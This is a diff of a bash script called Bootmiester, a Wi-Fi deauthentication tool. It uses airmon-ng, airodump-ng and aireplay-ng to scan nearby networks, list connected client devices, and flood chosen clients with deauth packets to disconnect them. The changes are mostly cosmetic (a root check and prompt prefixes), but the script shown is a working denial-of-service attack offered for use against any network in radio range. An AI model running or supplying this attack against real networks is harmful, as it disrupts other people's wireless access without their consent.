@@ -14,23 +14,30 @@ lred='\033[0;31m'
 white='\033[0;37m'
 PROCESS="xterm"
 
+root=$( id -u )
+if [ $root  != 0 ] ; then
+    echo -e "${Purple}[#] Run this Script as 'sudo'! "
+    sleep 2
+    exit
+fi
+
 clear
 echo -e "\tBOOTMIESTER\n\tBy: Yashvendra Kashyap\n\thttps://github.com/Yashvendra/Bootmiester" | boxes -d cat -a c | lolcat
 sleep 0.5
-echo -e "\n${white}+-------------------------------------------------------------+"
-echo -e "+                The ${Green}BOOTMIESTER${white} welcomes you                 +"
-echo -e "${white}+-------------------------------------------------------------+${NC}" 
-echo -ne "${Blue}Do you want to \e[0;37m(${Blue}p\e[0;37m)${Blue}roceed with the script or \e[0;37m(${Blue}q\e[0;37m)${Blue}quit \e[0;37m(${Blue}p/q\e[0;37m)${Blue}: \e[0;37m"
+echo
+#echo -e "\n${white}+-------------------------------------------------------------+"
+#echo -e "+                The ${Green}BOOTMIESTER${white} welcomes you                 +"
+#echo -e "${white}+-------------------------------------------------------------+${NC}" 
+echo -ne "${Cyan}[#] Do you want to \e[0;37m(${Cyan}p\e[0;37m)${Cyan}roceed with the script or \e[0;37m(${Cyan}q\e[0;37m)${Cyan}quit \e[0;37m(${Cyan}p/q\e[0;37m)${Cyan}: \e[0;37m"
 read op
-
 if [[ "$op" = "p" ]]
 then
 
-	echo -ne "${Blue}Enter your wireless interface name: ${White}"
+	echo -ne "${Blue}[#] Enter your wireless interface name: ${White}"
 	read interface
 
 	mkdir ~/Desktop/MACS
-	echo -e "${Green}Starting Monitor Mode on "${interface}" ${NC}"
+	echo -e "${Green}[*] Starting Monitor Mode on "${interface}" ${NC}"
 	sleep 2
 	airmon-ng check kill &>/dev/null && airmon-ng start ${interface} &>/dev/null
 	airodump-ng ${interface}mon -w ~/Desktop/wifi
@@ -40,7 +47,7 @@ then
 	awk -F, '{OFS=",";print $1}' ~/Desktop/wifi-01.kismet.csv | awk -F';' '{print $4}' | sed '1d' > ~/Desktop/MACS/wifi.txt
 	awk -F, '{OFS=",";print $1}' ~/Desktop/wifi-01.kismet.csv | awk -F';' '{print $6}' | sed '1d' > ~/Desktop/MACS/channels.txt
 
-	echo -e "${Green} WIFI's around you are: ${NC}"
+	echo -e "${Green}[*] WIFI's around you are: ${NC}"
 
 	cat ~/Desktop/MACS/wifi.txt | while read p
 	do 
@@ -48,7 +55,7 @@ then
 		x=$(( $x + 1 ))
 	done
 
-	echo -ne  "${Blue}CHOOSE a WIFI: ${White}"
+	echo -ne  "${Blue}[#] CHOOSE a WIFI: ${White}"
 	read choice
 
 	bssid=`sed "$choice!d" ~/Desktop/MACS/wifi.txt`
@@ -75,26 +82,27 @@ then
 		done
 		echo -e "${Blue}+-------------------------------------------------------+${NC}\n"
 		sleep 1
-		echo -e "${Green}Press 1 if you want to boot the above devices.\nPress 2 if you want to prevent a device to be booted.\nPress 3 If you want to boot a particular device.${NC}"
-		echo -ne "${Blue}Enter your Choice: ${White}"
+		echo -e "${Green}[*] Press 1 if you want to boot the above devices.\n[*] Press 2 if you want to prevent a device to be booted.\n[*] Press 3 If you want to boot a particular device.${NC}"
+		echo
+		echo -ne "${Blue}[#] Enter your Choice: ${White}"
 		read ch
 
 		if [ $ch -eq 2 ] 
 		then 
 			sleep 1
-			echo -ne "${Blue}Enter the Device's Address which should not be booted: ${White}"
+			echo -ne "${Blue}[#] Enter the Device's Address which should not be booted: ${White}"
 			read mac
 			sed -i "/$mac/d" ~/Desktop/MACS/devices.txt 
 			sleep 1
 			x=2
 		elif [ $ch -eq 1 ] 
 		then
-			echo -ne "${Blue}Enter number of deauth packets to send: ${White}"
+			echo -ne "${Blue}[#] Enter number of deauth packets to send: ${White}"
 			read packets
 			clear
 			sleep 1
 			a=100
-			echo -e "${Red}BOOTING the devices${Yellow} NOW"
+			echo -e "${Red}[*] BOOTING the devices${Yellow} NOW"
 			sleep 1
 			cat ~/Desktop/MACS/devices.txt | while read q
 			do
@@ -112,28 +120,28 @@ then
 					continue
 				else
 					echo ""
-					echo -e "${Green}Stopping Monitor mode on the interface...${NC}"
+					echo -e "${Green}[*] Stopping Monitor mode on the interface...${NC}"
 					xterm +hold -geometry 91x31+700+500 -e "airmon-ng stop ${interface}mon && service network-manager restart"
 					sleep 2
-					echo -e "${Green}Deleting the captured files..."
+					echo -e "${Green}[*] Deleting the captured files..."
 					sleep 2
 					rm -rf ~/Desktop/devices-*
 					rm -rf ~/Desktop/wifi-*
 					rm -rf ~/Desktop/MACS
-					echo -e "${Green}DONE."
+					echo -e "${Green}[*] DONE."
 					break
 				fi
 			done
 		elif [ $ch -eq 3 ]
 		then
                         sleep 1
-                        echo -ne "${Blue}Enter the Device's Address which should be booted: ${White}"
+	                echo -ne "${Blue}[#] Enter the Device's Address which should be booted: ${White}"
                         read mac
-			echo -ne "${Blue}Enter number of deauth packets to send: ${White}"
+			echo -ne "${Blue}[#] Enter number of deauth packets to send: ${White}"
 			read packets
 			sleep 1
 			clear
-			echo -e "${Red}BOOTING ${White}$mac ${Yellow}NOW"
+			echo -e "${Red}[*] BOOTING ${White}$mac ${Yellow}NOW"
 			sleep 1
 			xterm +hold -geometry 91x31+700+500 -e "aireplay-ng --deauth $packets -a $bssid -c $mac ${interface}mon" &
 			x=1
@@ -146,15 +154,15 @@ then
                                         continue
                                 else
                                         echo ""
-                                        echo -e "${Green}Stopping Monitor mode on the interface...${NC}"
+                                        echo -e "${Green}[*] Stopping Monitor mode on the interface...${NC}"
                                         xterm +hold -geometry 91x31+700+500 -e "airmon-ng stop ${interface}mon && service network-manager restart"
                                         sleep 2
-                                        echo -e "${Green}Deleting the captured files..."
+                                        echo -e "${Green}[*] Deleting the captured files..."
                                         sleep 2
                                         rm -rf ~/Desktop/devices-*
                                         rm -rf ~/Desktop/wifi-*
                                         rm -rf ~/Desktop/MACS
-                                        echo -e "${Green}DONE."
+                                        echo -e "${Green}[*] DONE."
                                         break
                                 fi
                         done
@@ -164,13 +172,13 @@ then
 
 elif [[ "$op" = "q" ]]
 then
-	echo -e "Byee! See you soon"
+	echo -e "[*] Byee! See you soon"
 	sleep 1
 	exit
 
 else
 	clear
-	echo -e "Wrong choice."
+	echo -e "[*] Wrong choice."
 	sleep 1
 	bootmiester
 fi
